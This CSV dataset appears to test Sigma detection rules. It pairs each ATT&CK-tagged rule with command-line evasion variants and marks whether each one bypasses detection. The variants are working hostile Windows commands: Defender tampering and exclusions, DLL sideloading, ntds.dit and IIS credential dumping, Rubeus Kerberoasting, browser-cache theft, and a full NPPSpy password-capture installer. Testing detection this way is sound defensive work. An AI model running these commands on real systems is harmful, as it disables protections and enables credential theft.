Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1562.001,proc_creation_win_powershell_remove_mppreference,Tamper Windows Defender Remove-MpPreference,07e3cb2c-0608-410d-be4b-1511cb1a0448,,"powershell.exe -Command ""Remove-MpPreference -ControlledFolderAccessProtectedFolders C:\""",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_set_service_disabled,Service StartupType Change Via PowerShell Set-Service,62b20d44-1546-4e61-afce-8e175eb9473c,,"powershell -Command ""Set-Service -Name Spooler -StartupType $env:StartupTypeValue"" --% -StartupTypeValue Disabled",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_pua_cleanwipe,PUA - CleanWipe Execution,f44800ac-38ec-471f-936e-3fa7d9c53100,,CATClean.exe --uninstall,FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_pua_cleanwipe,PUA - CleanWipe Execution,f44800ac-38ec-471f-936e-3fa7d9c53100,,not_an_installer.exe,FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_pua_cleanwipe,PUA - CleanWipe Execution,f44800ac-38ec-471f-936e-3fa7d9c53100,,NetInstaller.exe -r,FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_reg_defender_exclusion,Suspicious Windows Defender Folder Exclusion Added Via Reg.EXE,48917adc-a28e-4f5d-b729-11e75da8941f,,"reg.exe ADD ""HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"" /v ""C:\\Evil"" /t REG_DWORD /d 0 /f",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_reg_windows_defender_tamper,Suspicious Windows Defender Registry Key Tampering Via Reg.EXE,452bce90-6fb0-43cc-97a5-affc283139b3,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v TamperProtection /t REG_DWORD /d 00 /f",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_reg_windows_defender_tamper,Suspicious Windows Defender Registry Key Tampering Via Reg.EXE,452bce90-6fb0-43cc-97a5-affc283139b3,,reg add HKLM\SOFTWARE\Microsoft\Windows Defender\Features /v TamperProtection /t REG_DWORD /d 0 /f,FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_registry_office_disable_python_security_warnings,Python Function Execution Security Warning Disabled In Excel,023c654f-8f16-44d9-bb2b-00ff36a62af9,,"reg.exe add ""HKCU\Software\Microsoft\Office\16.0\Excel\Security"" /v PythonFunctionWarnings /d 0 /f",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_registry_office_disable_python_security_warnings,Python Function Execution Security Warning Disabled In Excel,023c654f-8f16-44d9-bb2b-00ff36a62af9,,reg.exe add HKCU\Software\Microsoft\Office\16.0\Excel\Security /v PythonFunctionWarnings /t REG_DWORD /d 0 /f,FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_registry_office_disable_python_security_warnings,Python Function Execution Security Warning Disabled In Excel,023c654f-8f16-44d9-bb2b-00ff36a62af9,,"reg.exe add ""HKCU\Software\Microsoft\Office\16.0\Excel\Security"" /v PythonFunctionWarnings /t REG_DWORD /d 0 /f",FALSE,FALSE,FALSE,
t1574.001,proc_creation_win_deviceenroller_dll_sideloading,Potential DLL Sideloading Via DeviceEnroller.EXE,e173ad47-4388-4012-ae62-bd13f71c18a8,,copy deviceenroller.exe not_an_enroller.exe && not_an_enroller.exe /PhoneDeepLink,FALSE,FALSE,FALSE,
t1574.001,proc_creation_win_dnscmd_install_new_server_level_plugin_dll,New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE,f63b56ee-3f79-4b8a-97fb-5c48007e8573,,dnscmd.exe /CONFIG /SERVERLEVELPLUGINDLL malicious.dll,FALSE,FALSE,FALSE,
t1574.001,proc_creation_win_dnscmd_install_new_server_level_plugin_dll,New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE,f63b56ee-3f79-4b8a-97fb-5c48007e8573,,dnscmd.exe /config /serverlevelplugindll malicious.dll,FALSE,FALSE,FALSE,
t1574.001,proc_creation_win_dnscmd_install_new_server_level_plugin_dll,New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE,f63b56ee-3f79-4b8a-97fb-5c48007e8573,,"dnscmd.exe /CONFIG /SERVERLEVELPLUGINDLL ""malicious.dll""",FALSE,FALSE,FALSE,
t1574.001,proc_creation_win_dnscmd_install_new_server_level_plugin_dll,New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE,f63b56ee-3f79-4b8a-97fb-5c48007e8573,,dnscmd.exe /SERVERLEVELPLUGINDLL malicious.dll /CONFIG,FALSE,FALSE,FALSE,
t1574.001,proc_creation_win_dnscmd_install_new_server_level_plugin_dll,New DNS ServerLevelPluginDll Installed Via Dnscmd.EXE,f63b56ee-3f79-4b8a-97fb-5c48007e8573,,dnscmd.exe /CONFIG /SERVERLEVELPLUGINDLL C:\malicious.dll,FALSE,FALSE,FALSE,
t1082,proc_creation_win_discovery_via_reg_queries,System Information Discovery via Registry Queries,0022869c-49f7-4ff2-ba03-85ac42ddac58,,powershell.exe Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion',FALSE,FALSE,FALSE,
t1082,proc_creation_win_discovery_via_reg_queries,System Information Discovery via Registry Queries,0022869c-49f7-4ff2-ba03-85ac42ddac58,,powershell.exe Invoke-Command -ScriptBlock { Start-Process 'cmd.exe' -ArgumentList '/c echo Success' },FALSE,FALSE,FALSE,
t1082,proc_creation_win_dtrace_kernel_dump,Suspicious Kernel Dump Using Dtrace,7124aebe-4cd7-4ccb-8df0-6d6b93c96795,,"dtrace.exe -w -n ""syscall:::return {lkd(0); exit(0);} """,FALSE,FALSE,FALSE,
t1082,proc_creation_win_dtrace_kernel_dump,Suspicious Kernel Dump Using Dtrace,7124aebe-4cd7-4ccb-8df0-6d6b93c96795,,dtrace.exe -w -n syscall:::return\ {lkd(0); exit(0);},FALSE,FALSE,FALSE,
t1082,proc_creation_win_dtrace_kernel_dump,Suspicious Kernel Dump Using Dtrace,7124aebe-4cd7-4ccb-8df0-6d6b93c96795,,dtrace.exe -w -n 'syscall:::return {lkd(0); exit(0);}',FALSE,FALSE,FALSE,
t1082,proc_creation_win_dtrace_kernel_dump,Suspicious Kernel Dump Using Dtrace,7124aebe-4cd7-4ccb-8df0-6d6b93c96795,,dtrace.exe -w -n syscall:::return {lkd(0); exit(0);},FALSE,FALSE,FALSE,
t1082,proc_creation_win_dtrace_kernel_dump,Suspicious Kernel Dump Using Dtrace,7124aebe-4cd7-4ccb-8df0-6d6b93c96795,,"dtrace.exe -n -w ""syscall:::return {lkd(0); exit(0);} """,FALSE,FALSE,FALSE,
t1082,proc_creation_win_dtrace_kernel_dump,Suspicious Kernel Dump Using Dtrace,7124aebe-4cd7-4ccb-8df0-6d6b93c96795,,"dtrace.exe -w -n ""syscall:::return {lkd(0); exit(0);}""",FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe applicationsinfo,FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe  applications info,FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe -applicationsinfo,FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe --applicationsinfo,FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe fileanalysis,FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe  file analysis,FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe -fileanalysis,FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe --fileanalysis,FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe servicesinfo,FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe  services info,FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe -servicesinfo,FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe --servicesinfo,FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe windowscreds,FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe  windows creds,FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe -windowscreds,FALSE,FALSE,FALSE,
t1082,proc_creation_win_hktl_winpeas,HackTool - winPEAS Execution,98b53e78-ebaf-46f8-be06-421aafd176d9,,winPEAS.exe --windowscreds,FALSE,FALSE,FALSE,
t1082,proc_creation_win_reg_machineguid,Suspicious Query of MachineGUID,f5240972-3938-4e56-8e4b-e33893176c1f,,REG   QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography   /v   MachineGuid,FALSE,FALSE,FALSE,
t1082,proc_creation_win_reg_machineguid,Suspicious Query of MachineGUID,f5240972-3938-4e56-8e4b-e33893176c1f,,"REG  QUERY ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography""  /v  MachineGuid",FALSE,FALSE,FALSE,
t1082,proc_creation_win_reg_machineguid,Suspicious Query of MachineGUID,f5240972-3938-4e56-8e4b-e33893176c1f,,REG   /v  MachineGuid  QUERY  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography,FALSE,FALSE,FALSE,
t1082,proc_creation_win_reg_machineguid,Suspicious Query of MachineGUID,f5240972-3938-4e56-8e4b-e33893176c1f,,REG  QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography  /v  MachineGuid  >  NUL,FALSE,FALSE,FALSE,
t1082,proc_creation_win_reg_machineguid,Suspicious Query of MachineGUID,f5240972-3938-4e56-8e4b-e33893176c1f,,REG  QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography  /v  MachineGuid  |  findstr  MachineGuid,FALSE,FALSE,FALSE,
t1055,proc_creation_win_dllhost_no_cli_execution,Dllhost.EXE Execution Anomaly,e7888eb1-13b0-4616-bd99-4bc0c2b054b9,,"""dllhost.exe""",FALSE,FALSE,FALSE,
t1055,proc_creation_win_hktl_coercedpotato,HackTool - CoercedPotato Execution,e8d34729-86a4-4140-adfd-0a29c2106307,,update_service.exe -e 1,FALSE,FALSE,FALSE,
t1055,proc_creation_win_hktl_dinjector,HackTool - DInjector PowerShell Cradle Execution,d78b5d61-187d-44b6-bf02-93486a80de5a,,DInjector.exe /am51 /password:secret,FALSE,FALSE,FALSE,
t1055,proc_creation_win_hktl_dinjector,HackTool - DInjector PowerShell Cradle Execution,d78b5d61-187d-44b6-bf02-93486a80de5a,,DInjector.exe /am^51 /password:secret,FALSE,FALSE,FALSE,
t1055,proc_creation_win_rundll32_inline_vbs,Suspicious Rundll32 Invoking Inline VBScript,1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd,,"copy rundll32.exe updater.exe && updater.exe vbscript:""Execute(RegRead('...')); window.close;""",FALSE,FALSE,FALSE,
t1055,proc_creation_win_rundll32_inline_vbs,Suspicious Rundll32 Invoking Inline VBScript,1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd,,copy rundll32.exe updater.exe && updater.exe vbscript:Execute(RegRead('...')); window.close;,FALSE,FALSE,FALSE,
t1055,proc_creation_win_rundll32_inline_vbs,Suspicious Rundll32 Invoking Inline VBScript,1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd,,"copy rundll32.exe updater.exe && updater.exe vbscript:Execute(RegRead(""..."")); window.close;",FALSE,FALSE,FALSE,
t1055,proc_creation_win_rundll32_inline_vbs,Suspicious Rundll32 Invoking Inline VBScript,1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd,,copy rundll32.exe updater.exe && updater.exe vbscript:Execute(RegRead('...'));window.close;,FALSE,FALSE,FALSE,
t1482,proc_creation_win_dsquery_domain_trust_discovery,Domain Trust Discovery Via Dsquery,3bad990e-4848-4a78-9530-b427d854aac0,,"dsquery * -filter ""(objectClass=trustedDomain)"" -attr *",FALSE,FALSE,FALSE,
t1482,proc_creation_win_dsquery_domain_trust_discovery,Domain Trust Discovery Via Dsquery,3bad990e-4848-4a78-9530-b427d854aac0,,dsquery * -filter '(objectClass=trustedDomain)' -attr *,FALSE,FALSE,FALSE,
t1482,proc_creation_win_dsquery_domain_trust_discovery,Domain Trust Discovery Via Dsquery,3bad990e-4848-4a78-9530-b427d854aac0,,dsquery * -filter (objectClass=trustedDomain) -attr *,FALSE,FALSE,FALSE,
t1482,proc_creation_win_dsquery_domain_trust_discovery,Domain Trust Discovery Via Dsquery,3bad990e-4848-4a78-9530-b427d854aac0,,dsquery -attr * * -filter (objectClass=trustedDomain),FALSE,FALSE,FALSE,
t1482,proc_creation_win_dsquery_domain_trust_discovery,Domain Trust Discovery Via Dsquery,3bad990e-4848-4a78-9530-b427d854aac0,,dsquery * -f (objectClass=trustedDomain) -attr *,FALSE,FALSE,FALSE,
t1482,proc_creation_win_dsquery_domain_trust_discovery,Domain Trust Discovery Via Dsquery,3bad990e-4848-4a78-9530-b427d854aac0,,dsquery * -filter (objectClass=trustedDomain) -a *,FALSE,FALSE,FALSE,
t1003,proc_creation_win_esentutl_params,Esentutl Gather Credentials,7df1713a-1a5b-4a4b-a071-dc83b144a101,,esentutl /p /d ntds.dit,FALSE,FALSE,FALSE,
t1003,proc_creation_win_esentutl_params,Esentutl Gather Credentials,7df1713a-1a5b-4a4b-a071-dc83b144a101,,esentutl.exe /p /d ntds.dit,FALSE,FALSE,FALSE,
t1003,proc_creation_win_esentutl_params,Esentutl Gather Credentials,7df1713a-1a5b-4a4b-a071-dc83b144a101,,esentutl  /p   /d ntds.dit,FALSE,FALSE,FALSE,
t1003,proc_creation_win_esentutl_params,Esentutl Gather Credentials,7df1713a-1a5b-4a4b-a071-dc83b144a101,,"esentutl ""/p"" /d ntds.dit",FALSE,FALSE,FALSE,
t1003,proc_creation_win_esentutl_params,Esentutl Gather Credentials,7df1713a-1a5b-4a4b-a071-dc83b144a101,,esentutl /p -d ntds.dit,FALSE,FALSE,FALSE,
t1003,proc_creation_win_esentutl_params,Esentutl Gather Credentials,7df1713a-1a5b-4a4b-a071-dc83b144a101,,esentutl /p /d C:\path\to\ntds.dit,FALSE,FALSE,FALSE,
t1003,proc_creation_win_hktl_rubeus,HackTool - Rubeus Execution,7ec2c172-dceb-4c10-92c9-87c1881b7e18,,not_malware.exe kerberoast /outfile:C:\Windows\Temp\hashes.txt,FALSE,FALSE,FALSE,
t1003,proc_creation_win_hktl_rubeus,HackTool - Rubeus Execution,7ec2c172-dceb-4c10-92c9-87c1881b7e18,,not_malware.exe asreproast /user:admin /format:hashcat,FALSE,FALSE,FALSE,
t1003,proc_creation_win_hktl_rubeus,HackTool - Rubeus Execution,7ec2c172-dceb-4c10-92c9-87c1881b7e18,,not_malware.exe kerberoast /outfile:pass.txt,FALSE,FALSE,FALSE,
t1003,proc_creation_win_iis_appcmd_service_account_password_dumped,Microsoft IIS Service Account Password Dumped,2d3cdeec-c0db-45b4-aa86-082f7eb75701,,appcmd.exe list config /section:identity,FALSE,FALSE,FALSE,
t1003,proc_creation_win_iis_appcmd_service_account_password_dumped,Microsoft IIS Service Account Password Dumped,2d3cdeec-c0db-45b4-aa86-082f7eb75701,,appcmd.exe  list   config /section:identity,FALSE,FALSE,FALSE,
t1003,proc_creation_win_iis_appcmd_service_account_password_dumped,Microsoft IIS Service Account Password Dumped,2d3cdeec-c0db-45b4-aa86-082f7eb75701,,appcmd.exe list config -section:identity,FALSE,FALSE,FALSE,
t1003,proc_creation_win_iis_appcmd_service_account_password_dumped,Microsoft IIS Service Account Password Dumped,2d3cdeec-c0db-45b4-aa86-082f7eb75701,,appcmd.exe list config /section:identity /xml,FALSE,FALSE,FALSE,
t1003,proc_creation_win_iis_appcmd_service_account_password_dumped,Microsoft IIS Service Account Password Dumped,2d3cdeec-c0db-45b4-aa86-082f7eb75701,,appcmd.exe list config /section:identity /@t:password,FALSE,FALSE,FALSE,
t1003,proc_creation_win_iis_connection_strings_decryption,Microsoft IIS Connection Strings Decryption,97dbf6e2-e436-44d8-abee-4261b24d3e41,,"aspnet_regiis.exe  -pdf   ""connectionStrings""   C:\inetpub\wwwroot",FALSE,FALSE,FALSE,
t1003,proc_creation_win_iis_connection_strings_decryption,Microsoft IIS Connection Strings Decryption,97dbf6e2-e436-44d8-abee-4261b24d3e41,,aspnet_regiis.exe -pdf connectionStrings C:\inetpub\wwwroot,FALSE,FALSE,FALSE,
t1003,proc_creation_win_iis_connection_strings_decryption,Microsoft IIS Connection Strings Decryption,97dbf6e2-e436-44d8-abee-4261b24d3e41,,"aspnet_regiis.exe -pdf ""connectionStrings"" C:\inetpub\wwwroot",FALSE,FALSE,FALSE,
t1003,proc_creation_win_reg_open_command,Suspicious Reg Add Open Command,dd3ee8cc-f751-41c9-ba53-5a32ed47e563,,"reg add ""HKCU\Software\Classes\ms-settings\shell\open\command"" /d ""test"" /f",FALSE,FALSE,FALSE,
t1003,proc_creation_win_reg_open_command,Suspicious Reg Add Open Command,dd3ee8cc-f751-41c9-ba53-5a32ed47e563,,reg add HKCU\Software\Classes\ms-settings\shell\open\command /d test /f,FALSE,FALSE,FALSE,
t1003,proc_creation_win_reg_open_command,Suspicious Reg Add Open Command,dd3ee8cc-f751-41c9-ba53-5a32ed47e563,,reg add HKCU\Software\Classes\ms-settings\shell\open\command -d test -f,FALSE,FALSE,FALSE,
t1003,proc_creation_win_registry_new_network_provider,Potential Credential Dumping Attempt Using New NetworkProvider - CLI,baef1ec6-2ca9-47a3-97cc-4cf2bda10b77,,"powershell.exe -Command ""Copy-Item 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\NPPSPY.dll' -Destination 'C:\Windows\System32'; $path = Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order' -Name PROVIDERORDER; $UpdatedValue = $Path.PROVIDERORDER + ',NPPSpy'; Set-ItemProperty -Path $Path.PSPath -Name 'PROVIDERORDER' -Value $UpdatedValue; New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore | Out-Null; New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore | Out-Null; New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name 'Class' -Value 2 -ErrorAction Ignore | Out-Null; New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name 'Name' -Value NPPSpy -ErrorAction Ignore | Out-Null; New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name 'ProviderPath' -PropertyType ExpandString -Value '%SystemRoot%\System32\NPPSPY.dll' -ErrorAction Ignore | Out-Null; Write-Output '[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt'""",FALSE,FALSE,FALSE,
t1003,proc_creation_win_registry_new_network_provider,Potential Credential Dumping Attempt Using New NetworkProvider - CLI,baef1ec6-2ca9-47a3-97cc-4cf2bda10b77,,reg.exe add HKLM\SYSTEM\CurrentControlSet\Services\MyProvider /v NetworkProvider /t REG_SZ /d malicious.dll /f,FALSE,FALSE,FALSE,
t1003,proc_creation_win_rpcping_credential_capture,Capture Credentials with Rpcping.exe,93671f99-04eb-4ab4-a161-70d446a84003,,rpcping.exe -s 10.0.0.5,FALSE,FALSE,FALSE,
t1003,proc_creation_win_rpcping_credential_capture,Capture Credentials with Rpcping.exe,93671f99-04eb-4ab4-a161-70d446a84003,,"""C:\\WINDOWS\\system32\\RpcPing.exe"" -s 127.0.0.1 -e 1234 -a privacy -u NTLM",FALSE,FALSE,FALSE,
t1003,proc_creation_win_rpcping_credential_capture,Capture Credentials with Rpcping.exe,93671f99-04eb-4ab4-a161-70d446a84003,,RpcPing.exe -s 127.0.0.1 -e 9997 /a connect /u NTLM,FALSE,FALSE,FALSE,
t1003,proc_creation_win_rpcping_credential_capture,Capture Credentials with Rpcping.exe,93671f99-04eb-4ab4-a161-70d446a84003,,RpcPing.exe -s 10.0.0.5,FALSE,FALSE,FALSE,
t1005,proc_creation_win_esentutl_webcache,Esentutl Steals Browser Information,6a69f62d-ce75-4b57-8dce-6351eb55b362,,"esentutl.exe /r ""%LocalAppData%\Microsoft\Windows\WebCache\WebCacheV01.dat"" /d",FALSE,FALSE,FALSE,
t1005,proc_creation_win_esentutl_webcache,Esentutl Steals Browser Information,6a69f62d-ce75-4b57-8dce-6351eb55b362,,"esentutl.exe -r ""%LocalAppData%\Microsoft\Windows\WebCache\WebCacheV01.dat"" /d",FALSE,FALSE,FALSE,
t1005,proc_creation_win_esentutl_webcache,Esentutl Steals Browser Information,6a69f62d-ce75-4b57-8dce-6351eb55b362,,esentutl.exe /r %LocalAppData%\Microsoft\Windows\WebCache\WebCacheV01.dat /d,FALSE,FALSE,FALSE,
t1005,proc_creation_win_esentutl_webcache,Esentutl Steals Browser Information,6a69f62d-ce75-4b57-8dce-6351eb55b362,,"set ""flag=/r"" && esentutl.exe %flag% ""%LocalAppData%\Microsoft\Windows\WebCache\WebCacheV01.dat"" /d",FALSE,FALSE,FALSE,
t1135,proc_creation_win_explorer_folder_shortcut_via_shell_binary,File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell,c3d76afc-93df-461e-8e67-9b2bad3f2ac4,,"explorer.exe ""shell:mycomputerfolder""",FALSE,FALSE,FALSE,
t1135,proc_creation_win_explorer_folder_shortcut_via_shell_binary,File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell,c3d76afc-93df-461e-8e67-9b2bad3f2ac4,,explorer.exe shell:mycomputerfolder,FALSE,FALSE,FALSE,
t1135,proc_creation_win_explorer_folder_shortcut_via_shell_binary,File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell,c3d76afc-93df-461e-8e67-9b2bad3f2ac4,,explorer.exe  shell:mycomputerfolder,FALSE,FALSE,FALSE,
t1135,proc_creation_win_explorer_folder_shortcut_via_shell_binary,File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell,c3d76afc-93df-461e-8e67-9b2bad3f2ac4,,explorer.exe shell:mycomputerfolder::,FALSE,FALSE,FALSE,
t1135,proc_creation_win_explorer_folder_shortcut_via_shell_binary,File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell,c3d76afc-93df-461e-8e67-9b2bad3f2ac4,,explorer.exe ::{20D04FE0-3AEA-1069-A2D8-08002B30309D},FALSE,FALSE,FALSE,
t1135,proc_creation_win_explorer_folder_shortcut_via_shell_binary,File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell,c3d76afc-93df-461e-8e67-9b2bad3f2ac4,,cmd.exe /c explorer.exe shell:mycomputerfolder,FALSE,FALSE,FALSE,
t1135,proc_creation_win_explorer_folder_shortcut_via_shell_binary,File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell,c3d76afc-93df-461e-8e67-9b2bad3f2ac4,,"powershell.exe -Command ""Start-Process explorer.exe -ArgumentList 'shell:mycomputerfolder'""",FALSE,FALSE,FALSE,
t1135,proc_creation_win_explorer_folder_shortcut_via_shell_binary,File Explorer Folder Opened Using Explorer Folder Shortcut Via Shell,c3d76afc-93df-461e-8e67-9b2bad3f2ac4,,"pwsh.exe -c ""Start-Process explorer.exe -ArgumentList 'shell:mycomputerfolder'""",FALSE,FALSE,FALSE,
